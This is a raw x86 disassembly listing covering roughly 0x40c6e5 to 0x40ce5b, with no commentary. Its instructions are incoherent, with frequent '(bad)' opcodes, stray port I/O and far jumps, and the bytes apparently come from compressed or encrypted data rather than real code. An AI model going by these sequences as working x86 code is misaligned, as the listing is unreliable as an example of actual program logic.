  40c6e5:	ret    
  40c6e6:	sbb    al,0xbc
  40c6e8:	pop    ss
  40c6e9:	xor    ah,bl
  40c6eb:	add    eax,0xde966573
  40c6f0:	xchg   edx,eax
  40c6f1:	fwait
  40c6f2:	in     eax,dx
  40c6f3:	jae    0x40c74a
  40c6f5:	push   esi
  40c6f6:	jne    0x40c723
  40c6f8:	mov    es,WORD PTR [eax-0x35]
  40c6fb:	pop    esp
  40c6fc:	push   0xd1729674
  40c701:	jge    0x40c756
  40c703:	or     al,0x45
  40c705:	jo     0x40c6e8
  40c707:	and    al,0xec
  40c709:	push   ss
  40c70a:	mov    edi,0x664dc5c7
  40c70f:	pushf  
  40c710:	int3   
  40c711:	clc    
  40c712:	bt     DWORD PTR [edx+0x13],eax
  40c716:	or     ah,BYTE PTR [esi+eiz*1+0x2e]
  40c71a:	cld    
  40c71b:	add    BYTE PTR [eax+0x3ec9758d],al
  40c721:	ror    DWORD PTR [edi-0x1df5afdd],cl
  40c727:	dec    ecx
  40c728:	mov    eax,0x47a65caa
  40c72d:	dec    edx
  40c72e:	cmp    DWORD PTR [eax-0x76475deb],0xffffffdf
  40c735:	pop    es
  40c736:	pop    ss
  40c737:	sub    BYTE PTR [esi+0x36e9cdae],al
  40c73d:	(bad)  
  40c73f:	ja     0x40c715
  40c741:	jg     0x40c6e6
  40c743:	dec    ecx
  40c744:	push   eax
  40c745:	lods   al,BYTE PTR ds:[esi]
  40c746:	test   al,0x33
  40c748:	(bad)  
  40c749:	rcl    DWORD PTR [ebx],0x87
  40c74c:	imul   ebx,DWORD PTR [ecx-0x32],0xb8cd6907
  40c753:	xor    al,0xde
  40c755:	in     al,0x3e
  40c757:	jg     0x40c6e0
  40c759:	ss jecxz 0x40c778
  40c75c:	adc    ebx,esi
  40c75e:	ss sbb edx,edx
  40c761:	pop    ebx
  40c762:	and    BYTE PTR [edx+0x6c53398],dl
  40c768:	neg    BYTE PTR [ecx-0x2f9cd039]
  40c76e:	inc    ecx
  40c76f:	mov    eax,DWORD PTR ds:0x4de0bfa1
  40c775:	inc    ecx
  40c776:	(bad)  
  40c778:	push   edx
  40c779:	add    al,BYTE PTR [ecx-0x52]
  40c77c:	sbb    dl,BYTE PTR [edx-0x2b05fda]
  40c782:	inc    DWORD PTR [esi+0x33f0eb4b]
  40c788:	stc    
  40c789:	sub    eax,0xc80a537c
  40c78e:	(bad)  
  40c78f:	out    dx,al
  40c790:	loop   0x40c768
  40c792:	push   ebx
  40c793:	and    al,0xd8
  40c795:	aad    0x22
  40c797:	or     al,0x28
  40c799:	div    bh
  40c79b:	push   es
  40c79c:	pusha  
  40c79d:	jae    0x40c7be
  40c79f:	adc    dh,dh
  40c7a1:	adc    bl,BYTE PTR ds:[ebp-0x22e411ef]
  40c7a8:	mov    esi,0x3d09897f
  40c7ad:	stos   DWORD PTR es:[edi],eax
  40c7ae:	lock stc 
  40c7b0:	inc    ebp
  40c7b1:	or     ebp,esi
  40c7b3:	imul   eax,DWORD PTR [esi-0xa],0x19b601ea
  40c7ba:	xchg   DWORD PTR [esi],esi
  40c7bc:	int    0x2c
  40c7be:	mov    ebx,DWORD PTR [eax+0x2e017649]
  40c7c4:	repnz and BYTE PTR [edi+0x64c287b3],cl
  40c7cb:	xor    BYTE PTR [edx],bh
  40c7cd:	or     eax,DWORD PTR [ecx-0x4fae4928]
  40c7d3:	pop    ss
  40c7d4:	mov    ebx,0x8acc6f08
  40c7d9:	dec    edx
  40c7da:	sbb    al,0x73
  40c7dc:	jb     0x40c805
  40c7de:	and    BYTE PTR [ebx-0x6878b026],bh
  40c7e4:	pop    ebx
  40c7e5:	mov    ecx,0x6c2eb1e6
  40c7ea:	bound  ebx,QWORD PTR [ebx]
  40c7ec:	or     bl,ah
  40c7ee:	add    al,0x43
  40c7f0:	mov    esp,0xaa5456cd
  40c7f5:	std    
  40c7f6:	dec    esp
  40c7f7:	leave  
  40c7f8:	sti    
  40c7f9:	jnp    0x40c849
  40c7fb:	add    edi,DWORD PTR [edi]
  40c7fd:	xor    ecx,DWORD PTR [ebp+0x1f]
  40c800:	adc    BYTE PTR [edi-0x4abcc24d],ah
  40c806:	sahf   
  40c807:	scas   al,BYTE PTR es:[edi]
  40c808:	repz inc eax
  40c80a:	mov    edi,0x434b9c0a
  40c80f:	(bad)  
  40c810:	stc    
  40c811:	pop    edi
  40c812:	or     al,0x83
  40c814:	add    al,BYTE PTR [ebx-0x3]
  40c817:	pop    ebx
  40c818:	rcr    BYTE PTR cs:[ebx-0x48752362],1
  40c81f:	pusha  
  40c820:	pushf  
  40c821:	fwait
  40c822:	sbb    DWORD PTR [ebx-0x2e6a734b],edi
  40c828:	xor    eax,0xe9e2f770
  40c82d:	aaa    
  40c82e:	push   esi
  40c82f:	sbb    BYTE PTR [ebx],bh
  40c831:	xchg   edx,eax
  40c832:	xor    dl,al
  40c834:	fwait
  40c835:	pop    eax
  40c836:	inc    eax
  40c837:	xchg   DWORD PTR [edx-0x6728a06b],edx
  40c83d:	mov    DWORD PTR [ecx-0x187caa1],eax
  40c843:	or     al,0x81
  40c845:	jo     0x40c888
  40c847:	out    0x95,al
  40c849:	cld    
  40c84a:	js     0x40c8c2
  40c84c:	mov    ch,0x78
  40c84e:	aad    0x3d
  40c850:	jmp    0xd1c5:0x28c63124
  40c857:	repz adc eax,0xc5c14b0a
  40c85d:	cmp    BYTE PTR [ecx],0x53
  40c860:	mov    WORD PTR [ebp+0x3f542304],?
  40c866:	ins    BYTE PTR es:[edi],dx
  40c867:	ins    DWORD PTR es:[edi],dx
  40c868:	imul   edx,DWORD PTR [eax-0x5b],0x64d8e456
  40c86f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c870:	cmp    ch,BYTE PTR [edi-0x7f749768]
  40c876:	shl    BYTE PTR [edi+esi*8-0x75],1
  40c87a:	stos   BYTE PTR es:[edi],al
  40c87b:	push   0x63ec2fff
  40c880:	sub    al,0x98
  40c882:	(bad)  
  40c883:	sbb    ch,BYTE PTR [eax+0x315232bf]
  40c889:	(bad)  
  40c88a:	mov    bh,0xc9
  40c88c:	sub    al,0xf1
  40c88e:	test   al,0xc2
  40c890:	pop    esp
  40c891:	mov    dl,0xc5
  40c893:	fwait
  40c894:	dec    ecx
  40c895:	aas    
  40c896:	mov    dh,BYTE PTR [eax+0x1e]
  40c899:	sub    eax,0x75c786f0
  40c89e:	call   0xcfb3bede
  40c8a3:	jnp    0x40c873
  40c8a5:	adc    bh,cl
  40c8a7:	fiadd  WORD PTR [ecx+0x16]
  40c8aa:	cdq    
  40c8ab:	fcom   DWORD PTR [eax-0x7f25aaff]
  40c8b1:	rcr    DWORD PTR [ebp+0x7c],1
  40c8b4:	int    0xe7
  40c8b6:	inc    edx
  40c8b7:	push   0x7e057c2f
  40c8bc:	(bad)  
  40c8bd:	lods   al,BYTE PTR ds:[esi]
  40c8be:	jge    0x40c862
  40c8c0:	call   DWORD PTR [ebx]
  40c8c2:	cmp    eax,ebx
  40c8c4:	pop    es
  40c8c5:	push   esi
  40c8c6:	add    DWORD PTR ds:0x2fc6ee65,esp
  40c8cc:	aas    
  40c8cd:	(bad)  
  40c8ce:	mov    eax,0xc66d16
  40c8d3:	fidiv  WORD PTR [esi-0x31]
  40c8d6:	mov    DWORD PTR [esi+eiz*1],ecx
  40c8d9:	leave  
  40c8da:	aad    0x69
  40c8dc:	mov    WORD PTR ds:0x7197b5f6,es
  40c8e2:	xchg   ecx,eax
  40c8e3:	and    DWORD PTR [ebx],0xffffff84
  40c8e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8e7:	(bad)  
  40c8e9:	push   0x513f8be4
  40c8ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8ef:	push   ebp
  40c8f0:	inc    edx
  40c8f1:	pop    ds
  40c8f2:	sub    al,0x98
  40c8f4:	pop    ds
  40c8f5:	js     0x40c918
  40c8f7:	and    dh,BYTE PTR [ebx+esi*2-0x289bea34]
  40c8fe:	and    DWORD PTR [ecx+0x29],0x1114d07a
  40c905:	xchg   ecx,eax
  40c906:	outs   dx,DWORD PTR ds:[esi]
  40c907:	adc    edx,eax
  40c909:	adc    eax,0xb0f06e09
  40c90e:	mov    edi,0x5f5d1431
  40c913:	not    DWORD PTR [ecx-0x7c]
  40c916:	mov    ecx,0x273439e
  40c91b:	adc    cl,BYTE PTR [edi]
  40c91d:	test   eax,0x455a9262
  40c922:	push   ebp
  40c923:	push   ss
  40c924:	push   edx
  40c925:	stos   BYTE PTR es:[edi],al
  40c926:	xchg   ebx,eax
  40c927:	in     eax,0xcc
  40c929:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c92a:	shr    DWORD PTR [eax+0x4730d287],0x42
  40c931:	in     al,0x76
  40c933:	mov    ebp,0x2be2a1c6
  40c938:	arpl   WORD PTR [esi-0x58adb30c],si
  40c93e:	nop
  40c93f:	fild   DWORD PTR [edx+0x29417dd5]
  40c945:	jmp    0x5067:0x5321d9e2
  40c94c:	pop    ebx
  40c94d:	daa    
  40c94e:	sbb    ebx,DWORD PTR [ecx]
  40c950:	push   ecx
  40c951:	out    dx,al
  40c952:	mov    ch,0x8f
  40c954:	mov    esp,0x647d4bcf
  40c959:	pop    ds
  40c95a:	daa    
  40c95b:	stos   DWORD PTR es:[edi],eax
  40c95c:	das    
  40c95d:	jne    0x40c8fa
  40c95f:	push   ecx
  40c960:	repnz mov edx,0x98260b66
  40c966:	test   al,0x74
  40c968:	mov    ebx,0xed92ec6
  40c96d:	mov    ds:0xf0707147,eax
  40c972:	jg     0x40c9cc
  40c974:	mov    WORD PTR ds:0x80783d5,es
  40c97a:	xor    edi,DWORD PTR [eax+edx*4-0x77c9ad55]
  40c981:	aad    0x54
  40c983:	ins    BYTE PTR es:[edi],dx
  40c984:	sub    DWORD PTR [edi-0x63420e32],0xc4ff6b08
  40c98e:	dec    esp
  40c98f:	out    0xdd,al
  40c991:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c992:	lods   eax,DWORD PTR ds:[esi]
  40c993:	cmc    
  40c994:	(bad)  
  40c995:	retf   0x483e
  40c998:	xor    bh,BYTE PTR [edi-0x61c0ef33]
  40c99e:	cmp    eax,0xe143341c
  40c9a3:	test   BYTE PTR [ebx-0x25],bh
  40c9a6:	dec    ecx
  40c9a7:	adc    eax,0x61835ced
  40c9ac:	push   esi
  40c9ad:	mov    ebp,0xdf2d216b
  40c9b2:	in     eax,dx
  40c9b3:	scas   eax,DWORD PTR es:[edi]
  40c9b4:	mov    eax,0x9fe5f591
  40c9b9:	aas    
  40c9ba:	les    ebp,FWORD PTR [esi-0x4db08006]
  40c9c0:	stos   BYTE PTR es:[edi],al
  40c9c1:	ret    0xd4f2
  40c9c4:	xchg   esi,eax
  40c9c5:	or     DWORD PTR [ebp-0x3c],esp
  40c9c8:	mov    edi,0xe4eb13f
  40c9cd:	loope  0x40c9aa
  40c9cf:	or     edx,DWORD PTR [edi+ebp*2+0x2a]
  40c9d3:	jmp    0xe6876f60
  40c9d8:	imul   esp,eax,0xfffffff8
  40c9db:	mov    BYTE PTR [edx-0x6a],ch
  40c9de:	sbb    ebp,DWORD PTR [edx]
  40c9e0:	adc    BYTE PTR [edx],ch
  40c9e2:	sub    al,0xff
  40c9e4:	retf   
  40c9e5:	sub    eax,0x3d03e2fa
  40c9ea:	mov    eax,0xbb392be1
  40c9ef:	pushfw 
  40c9f1:	xor    eax,0x81edcb79
  40c9f6:	gs cwde 
  40c9f8:	pop    ss
  40c9f9:	push   0x25880aac
  40c9fe:	(bad)  
  40c9ff:	mov    ebp,0xabad72d9
  40ca04:	popf   
  40ca05:	fs push edi
  40ca07:	xor    DWORD PTR ds:0x9493b030,esp
  40ca0d:	imul   edx,esp,0xe1bc0afd
  40ca13:	(bad)  
  40ca14:	xchg   esp,eax
  40ca15:	mov    esp,0x3699c7d
  40ca1a:	dec    esp
  40ca1b:	and    DWORD PTR [esi+esi*1],esp
  40ca1e:	inc    ebx
  40ca1f:	dec    esp
  40ca20:	cmp    BYTE PTR [ebx+eiz*8-0x7771a981],dl
  40ca27:	cs std 
  40ca29:	push   cs
  40ca2a:	xchg   esp,eax
  40ca2b:	ins    BYTE PTR es:[edi],dx
  40ca2c:	and    dl,al
  40ca2e:	jbe    0x40ca2f
  40ca30:	push   eax
  40ca31:	jns    0x40ca05
  40ca33:	xor    ecx,esi
  40ca35:	and    BYTE PTR [esi-0x7e],al
  40ca38:	or     eax,0xffab3852
  40ca3d:	push   cs
  40ca3e:	adc    eax,0xbb11a119
  40ca43:	push   edi
  40ca44:	mov    edi,0x77cd8589
  40ca49:	cmp    DWORD PTR [esi-0x42df2c9d],esp
  40ca4f:	cmc    
  40ca50:	bndstx [esi+ecx*2],bnd2
  40ca54:	fld    st(5)
  40ca56:	mov    esp,0x91ad5f5d
  40ca5b:	jno    0x40caa3
  40ca5d:	pushf  
  40ca5e:	int3   
  40ca5f:	in     al,dx
  40ca60:	xchg   ecx,eax
  40ca61:	ja     0x40cab6
  40ca63:	mov    ecx,0xa1ccb77e
  40ca68:	int3   
  40ca69:	sbb    edx,esp
  40ca6b:	mov    bl,0x44
  40ca6d:	pop    esi
  40ca6e:	icebp  
  40ca6f:	dec    esp
  40ca70:	lahf   
  40ca71:	add    eax,0x4feb9db9
  40ca76:	jecxz  0x40ca5d
  40ca78:	sbb    eax,0x561c93aa
  40ca7d:	pop    ebx
  40ca7e:	rol    BYTE PTR [ebp+edi*8+0x2a],0x7c
  40ca83:	out    dx,al
  40ca84:	and    eax,0xedefb1a4
  40ca89:	adc    al,0xe4
  40ca8b:	pop    ebx
  40ca8c:	xchg   ecx,eax
  40ca8d:	pop    es
  40ca8e:	dec    edx
  40ca8f:	adc    DWORD PTR [esi-0x69e94545],esp
  40ca95:	sub    BYTE PTR [ecx],0x8f
  40ca98:	pop    ebp
  40ca99:	cli    
  40ca9a:	or     ah,BYTE PTR [edi]
  40ca9c:	pop    eax
  40ca9d:	inc    ecx
  40ca9e:	or     edi,ebp
  40caa0:	mov    cl,0xcf
  40caa2:	stc    
  40caa3:	fsub   QWORD PTR [ecx+ebp*8+0x1a]
  40caa7:	jae    0x40cade
  40caa9:	mov    al,0x12
  40caab:	out    dx,eax
  40caac:	and    eax,0x79272933
  40cab1:	int    0x28
  40cab3:	inc    eax
  40cab4:	dec    esi
  40cab5:	dec    esp
  40cab6:	pop    esi
  40cab7:	in     al,0xca
  40cab9:	pop    eax
  40caba:	rcr    BYTE PTR ss:[esi-0x31df417f],0x1b
  40cac2:	rcl    DWORD PTR [ebp+0x5f],cl
  40cac5:	ret    0x4ad0
  40cac8:	(bad)  
  40cac9:	jne    0x40cb0a
  40cacb:	jle    0x40cabe
  40cacd:	xchg   ebp,eax
  40cace:	nop
  40cacf:	call   0x5cbb2b78
  40cad4:	sub    eax,0xd59ed15c
  40cad9:	mov    ch,ah
  40cadb:	dec    eax
  40cadc:	add    eax,0x26bdffbf
  40cae1:	push   ebx
  40cae2:	jb     0x40caa5
  40cae4:	sub    al,0x5c
  40cae6:	sbb    DWORD PTR [ebp+0x658e3156],0x1338752c
  40caf0:	mov    bh,0xd6
  40caf2:	inc    esi
  40caf3:	fsubp  st(3),st
  40caf5:	aad    0x5b
  40caf7:	dec    BYTE PTR [esi]
  40caf9:	xchg   edx,eax
  40cafa:	jb     0x40caef
  40cafc:	int3   
  40cafd:	stc    
  40cafe:	mov    DWORD PTR [ebx],ebx
  40cb00:	or     bh,BYTE PTR [esi-0x5c8bb757]
  40cb06:	ss out dx,eax
  40cb08:	jnp    0x40cae3
  40cb0a:	or     eax,0x7a74b7e6
  40cb0f:	outs   dx,DWORD PTR ds:[esi]
  40cb10:	adc    bl,BYTE PTR [edi]
  40cb12:	es mov eax,0x365042c1
  40cb18:	pop    eax
  40cb19:	cs dec ecx
  40cb1b:	pop    eax
  40cb1c:	je     0x40cab9
  40cb1e:	and    BYTE PTR [edi+0x1b],dl
  40cb21:	and    eax,0xbed3a628
  40cb26:	clc    
  40cb27:	bnd call 0xff6c70d2
  40cb2d:	mov    dh,0xa4
  40cb2f:	and    ebp,DWORD PTR [eax]
  40cb31:	jbe    0x40cafc
  40cb33:	and    ch,bl
  40cb35:	xchg   edx,eax
  40cb36:	and    bh,BYTE PTR [ebx-0x4e22373d]
  40cb3c:	loop   0x40cb2e
  40cb3e:	push   ds
  40cb3f:	enter  0x2c4d,0xdf
  40cb43:	xchg   ecx,eax
  40cb44:	fstp   st(6)
  40cb46:	lds    esi,FWORD PTR [esi+esi*8]
  40cb49:	fstp   TBYTE PTR [ecx]
  40cb4b:	xchg   DWORD PTR [edx],ecx
  40cb4d:	gs loop 0x40cb1d
  40cb50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb51:	cmp    BYTE PTR [ebx-0x69e823cc],0x73
  40cb58:	pop    ds
  40cb59:	outs   dx,BYTE PTR ds:[esi]
  40cb5a:	jge    0x40cbc6
  40cb5c:	sbb    al,0xfd
  40cb5e:	jmp    0xd807:0x570e998c
  40cb65:	push   0xffffff9c
  40cb67:	fadd   QWORD PTR [ebx-0x1a9ce640]
  40cb6d:	pop    ecx
  40cb6e:	stos   DWORD PTR es:[edi],eax
  40cb6f:	mov    dh,0x9c
  40cb71:	cmp    cl,BYTE PTR [ebx-0x41031074]
  40cb77:	sar    dh,0xb
  40cb7a:	fnstenv [ecx+ebp*8-0x5c]
  40cb7e:	arpl   WORD PTR [esi-0x7d],sp
  40cb81:	shl    BYTE PTR [ecx],1
  40cb83:	jge    0x40cb6e
  40cb85:	into   
  40cb86:	jmp    0xf9eea0ab
  40cb8b:	iret   
  40cb8c:	in     eax,dx
  40cb8d:	repz add DWORD PTR [ebx],ebp
  40cb90:	in     al,dx
  40cb91:	jno    0x40cb52
  40cb93:	sahf   
  40cb94:	fisubr WORD PTR [eax]
  40cb96:	lods   al,BYTE PTR ds:[esi]
  40cb97:	lea    edi,[esi]
  40cb99:	fimul  WORD PTR [ebx]
  40cb9b:	inc    edi
  40cb9c:	mov    ds:0xccf68803,eax
  40cba1:	sbb    al,0x36
  40cba3:	inc    edx
  40cba4:	mov    eax,0x147a0444
  40cba9:	xchg   esp,eax
  40cbaa:	jmp    0x2e75:0x7397f17d
  40cbb1:	or     esp,DWORD PTR [esi+0x232165ab]
  40cbb7:	sbb    BYTE PTR [ebx+0x4f0d45b2],al
  40cbbd:	sbb    DWORD PTR [ecx+0xb],esi
  40cbc0:	leave  
  40cbc1:	jo     0x40cc21
  40cbc3:	jne    0x40cb86
  40cbc5:	gs pop edx
  40cbc7:	xchg   edx,eax
  40cbc8:	adc    DWORD PTR [eax+edi*2-0x30],ebx
  40cbcc:	xor    dh,BYTE PTR [ebx-0x29581986]
  40cbd2:	popf   
  40cbd3:	fadd   st,st(2)
  40cbd5:	fidivr WORD PTR [esi]
  40cbd7:	lods   al,BYTE PTR ds:[esi]
  40cbd8:	addr16 aaa 
  40cbda:	pop    ebp
  40cbdb:	bound  esp,QWORD PTR [edx+0x10170f69]
  40cbe1:	repz inc eax
  40cbe3:	fwait
  40cbe4:	sub    BYTE PTR [ebp+edi*2-0x563b9d56],0x1f
  40cbec:	sub    eax,0xd5d378ab
  40cbf1:	scas   al,BYTE PTR es:[edi]
  40cbf2:	sub    al,0x8b
  40cbf4:	mov    ch,ch
  40cbf6:	in     eax,dx
  40cbf7:	push   ds
  40cbf8:	mov    ebx,0x482ed3a6
  40cbfd:	or     eax,0x5809958f
  40cc02:	add    BYTE PTR [edi-0x5a4c58bb],0x43
  40cc09:	sub    ch,BYTE PTR ds:0xbd979ba7
  40cc0f:	jb     0x40cc1c
  40cc11:	adc    al,0xb1
  40cc13:	out    dx,al
  40cc14:	jo     0x40cc0e
  40cc16:	addr16 out 0x78,eax
  40cc19:	pop    ss
  40cc1a:	shl    al,1
  40cc1c:	jns    0x40cc19
  40cc1e:	test   BYTE PTR [esp+edx*4-0x1d],ah
  40cc22:	adc    al,0x81
  40cc24:	lahf   
  40cc25:	add    DWORD PTR [esi+0x56],edi
  40cc28:	push   ebp
  40cc29:	or     esp,ebp
  40cc2b:	inc    esi
  40cc2c:	jns    0x40cc32
  40cc2e:	xchg   edx,eax
  40cc2f:	push   eax
  40cc30:	scas   eax,DWORD PTR es:[edi]
  40cc31:	adc    DWORD PTR [esi+0x63],ebx
  40cc34:	sub    edx,DWORD PTR [edx]
  40cc36:	in     al,dx
  40cc37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc38:	jno    0x40ccb2
  40cc3a:	pop    ecx
  40cc3b:	(bad)  [edi+0x1a]
  40cc3e:	xor    esp,DWORD PTR [ecx+eax*2+0x79]
  40cc42:	hlt    
  40cc43:	jle    0x40cc39
  40cc45:	mov    ch,0x9d
  40cc47:	and    BYTE PTR [edx-0x59],dh
  40cc4a:	sbb    eax,0x26d92fa3
  40cc4f:	cwde   
  40cc50:	(bad)  
  40cc51:	sub    eax,0x6581704d
  40cc56:	imul   edx,DWORD PTR [edi+ecx*1],0xd599aa35
  40cc5d:	sbb    esi,DWORD PTR [ecx-0x1938cc9b]
  40cc63:	lea    edx,[ebx]
  40cc65:	cmp    eax,0x96b33f44
  40cc6a:	dec    edi
  40cc6b:	ins    DWORD PTR es:[edi],dx
  40cc6c:	fst    DWORD PTR [eax-0x1df363be]
  40cc72:	and    al,0x18
  40cc74:	dec    ecx
  40cc75:	dec    edi
  40cc76:	pop    edi
  40cc77:	mov    ecx,0xd7ea687c
  40cc7c:	lods   al,BYTE PTR ds:[esi]
  40cc7d:	and    ah,BYTE PTR [edi-0x45]
  40cc80:	sub    eax,0xd3266d44
  40cc85:	rcr    BYTE PTR [ecx-0x17],0x55
  40cc89:	fsub   DWORD PTR [eax+0x57]
  40cc8c:	shl    BYTE PTR [ebx+edx*4+0x28],0x7a
  40cc91:	mov    bh,0xe6
  40cc93:	lock inc edx
  40cc95:	stc    
  40cc96:	adc    edi,esp
  40cc98:	retf   0x81d
  40cc9b:	in     eax,0xfc
  40cc9d:	fnstsw ax
  40cc9f:	aad    0xbc
  40cca1:	pop    ebx
  40cca2:	push   cs
  40cca3:	nop
  40cca4:	imul   eax,edx,0xc900fe50
  40ccaa:	jl     0x40ccb4
  40ccac:	rcr    BYTE PTR [edi-0x4ccf3a1e],1
  40ccb2:	push   ss
  40ccb3:	xchg   esp,eax
  40ccb4:	iret   
  40ccb5:	add    ebp,DWORD PTR [ebx]
  40ccb7:	dec    eax
  40ccb8:	xor    edi,DWORD PTR [ebp-0x23a78042]
  40ccbe:	add    esp,DWORD PTR [ebp-0x11]
  40ccc1:	outs   dx,DWORD PTR ds:[esi]
  40ccc2:	xor    DWORD PTR [edi+eiz*8],edx
  40ccc5:	cmp    al,0x4d
  40ccc7:	lea    edi,[ecx-0x6d]
  40ccca:	out    0x96,al
  40cccc:	mov    esp,0x208ec034
  40ccd1:	push   eax
  40ccd2:	cs fcmovne st,st(2)
  40ccd5:	inc    ebx
  40ccd6:	in     al,dx
  40ccd7:	add    eax,0x802463b7
  40ccdc:	ins    DWORD PTR es:[edi],dx
  40ccdd:	xor    al,0x4d
  40ccdf:	jbe    0x40cc88
  40cce1:	mov    ecx,0xf3d3a754
  40cce6:	scas   eax,DWORD PTR es:[edi]
  40cce7:	dec    ebp
  40cce8:	mov    bh,0xcd
  40ccea:	sti    
  40cceb:	lahf   
  40ccec:	push   0x97ddb66f
  40ccf1:	or     eax,0xfc1f28d1
  40ccf6:	cmc    
  40ccf7:	jb     0x40cd4e
  40ccf9:	xor    eax,0x939e3c80
  40ccfe:	xchg   ebx,eax
  40ccff:	aas    
  40cd00:	jnp    0x40ccbb
  40cd02:	scas   eax,DWORD PTR es:[edi]
  40cd03:	(bad)  
  40cd04:	clc    
  40cd05:	sub    al,0x9e
  40cd07:	mov    WORD PTR ds:0xc3b82287,es
  40cd0d:	in     al,0xdc
  40cd0f:	rol    esp,1
  40cd11:	cwde   
  40cd12:	sti    
  40cd13:	mov    esi,0xd488b558
  40cd18:	push   0x8fc9f815
  40cd1d:	scas   al,BYTE PTR es:[edi]
  40cd1e:	fimul  DWORD PTR [eax+0x2f]
  40cd21:	fs lock sti 
  40cd24:	rcr    DWORD PTR [esi+0x7751b86d],0xe6
  40cd2b:	bound  esi,QWORD PTR [edx-0x41]
  40cd2e:	fmul   QWORD PTR [ebx-0x13]
  40cd31:	loope  0x40cda8
  40cd33:	cld    
  40cd34:	mov    ds:0x4a16159a,eax
  40cd39:	scas   al,BYTE PTR es:[edi]
  40cd3a:	les    edi,FWORD PTR [edx]
  40cd3c:	(bad)  
  40cd3d:	ds hlt 
  40cd3f:	in     eax,dx
  40cd40:	mov    WORD PTR [eax+0x6eb8ab61],cs
  40cd46:	loope  0x40cd1a
  40cd48:	mov    bl,BYTE PTR [ebp-0x7f7f3841]
  40cd4e:	stos   DWORD PTR es:[edi],eax
  40cd4f:	pop    ecx
  40cd50:	dec    edi
  40cd51:	add    eax,0x38ad9fe5
  40cd56:	sub    bh,0x42
  40cd59:	xor    esi,DWORD PTR [edx]
  40cd5b:	cld    
  40cd5c:	dec    ebp
  40cd5d:	hlt    
  40cd5e:	push   ecx
  40cd5f:	ja     0x40cd95
  40cd61:	pushf  
  40cd62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd63:	pop    es
  40cd64:	jle    0x40cdbf
  40cd66:	in     eax,dx
  40cd67:	ins    BYTE PTR es:[edi],dx
  40cd68:	hlt    
  40cd69:	out    dx,al
  40cd6a:	mov    bl,0x12
  40cd6c:	xchg   BYTE PTR [edi],bl
  40cd6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd6f:	clc    
  40cd70:	xchg   DWORD PTR [eax+0x29c9bbd],ecx
  40cd76:	arpl   WORD PTR [edi],si
  40cd78:	cmp    eax,0x74faf94a
  40cd7d:	sbb    BYTE PTR [ecx],dl
  40cd7f:	clc    
  40cd80:	pop    esp
  40cd81:	xchg   DWORD PTR [edi+0x2af5d97a],ebp
  40cd87:	and    al,0x90
  40cd89:	shl    BYTE PTR [esi+0x34],1
  40cd8c:	adc    cl,BYTE PTR [esi]
  40cd8e:	push   esp
  40cd8f:	inc    esp
  40cd90:	sti    
  40cd91:	pop    edx
  40cd92:	ffree  st(3)
  40cd94:	imul   esi,edx,0xb2ff8ea0
  40cd9a:	test   al,0x7e
  40cd9c:	xchg   edi,eax
  40cd9d:	and    ah,BYTE PTR [ebp+eax*2+0x49]
  40cda1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cda2:	out    0xbc,eax
  40cda4:	shl    DWORD PTR [ebx-0x3d],cl
  40cda7:	jmp    0xde93:0xaafe5a9
  40cdae:	call   0x87e87748
  40cdb3:	addr16 (bad) 
  40cdb5:	cld    
  40cdb6:	and    BYTE PTR [eax+0x78],ch
  40cdb9:	imul   eax,DWORD PTR [eax+0xc],0xf3d797cb
  40cdc0:	jnp    0x40ce0c
  40cdc2:	rcr    BYTE PTR [eax],1
  40cdc4:	and    eax,DWORD PTR cs:[esi-0x6]
  40cdc8:	cmp    ah,BYTE PTR fs:[ebp-0x2ab585d4]
  40cdcf:	fs mov esi,ecx
  40cdd2:	and    ebp,DWORD PTR [edi-0x3ae0f2ef]
  40cdd8:	push   edx
  40cdd9:	ins    DWORD PTR es:[edi],dx
  40cdda:	jb     0x40cd7e
  40cddc:	dec    ecx
  40cddd:	retf   0x1c32
  40cde0:	lods   eax,DWORD PTR ds:[esi]
  40cde1:	popa   
  40cde2:	or     eax,0xdb750a3e
  40cde7:	sub    edx,ecx
  40cde9:	clc    
  40cdea:	mov    eax,0x2d2a61e1
  40cdef:	sahf   
  40cdf0:	fcom   QWORD PTR [edx]
  40cdf2:	shr    DWORD PTR [eax],0x13
  40cdf5:	and    bh,BYTE PTR [edi+0x40]
  40cdf8:	int    0x53
  40cdfa:	into   
  40cdfb:	jle    0x40cdd3
  40cdfd:	mov    BYTE PTR [esi],al
  40cdff:	adc    esi,esp
  40ce01:	add    al,0x6f
  40ce03:	mov    ch,0xf4
  40ce05:	jbe    0x40ce10
  40ce07:	add    DWORD PTR [eax+edi*1],0xfffffff2
  40ce0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce0c:	and    BYTE PTR [edx],al
  40ce0e:	shr    DWORD PTR [esi],1
  40ce10:	inc    esp
  40ce11:	(bad)  
  40ce12:	sub    al,0x49
  40ce14:	mov    cl,0xf0
  40ce16:	add    dh,BYTE PTR [eax-0x30]
  40ce19:	pushf  
  40ce1a:	je     0x40ce45
  40ce1c:	mov    fs:0x3c373fa,al
  40ce22:	popa   
  40ce23:	lods   al,BYTE PTR ds:[esi]
  40ce24:	in     eax,0x3d
  40ce26:	in     eax,dx
  40ce27:	in     eax,0xc2
  40ce29:	and    dh,BYTE PTR [ebx+edx*1+0x775a706c]
  40ce30:	fisub  WORD PTR [ebx+0x5e]
  40ce33:	shr    edx,1
  40ce35:	xchg   BYTE PTR [ebp-0x20f6a742],dl
  40ce3b:	sbb    ebp,0x90cfa0f1
  40ce41:	adc    DWORD PTR [esi+0x7d],eax
  40ce44:	and    ch,BYTE PTR [ecx-0x65]
  40ce47:	pop    ebp
  40ce48:	jae    0x40ce9f
  40ce4a:	pop    ecx
  40ce4b:	mov    ?,WORD PTR [ecx-0x54720310]
  40ce51:	mov    bh,0xa5
  40ce53:	cwde   
  40ce54:	xlat   BYTE PTR ds:[ebx]
  40ce55:	aaa    
  40ce56:	xor    esp,DWORD PTR [esi]
  40ce58:	int3   
  40ce59:	and    al,dl
  40ce5b:	and    DWORD PTR [eax+0x6f],0xfffffff8
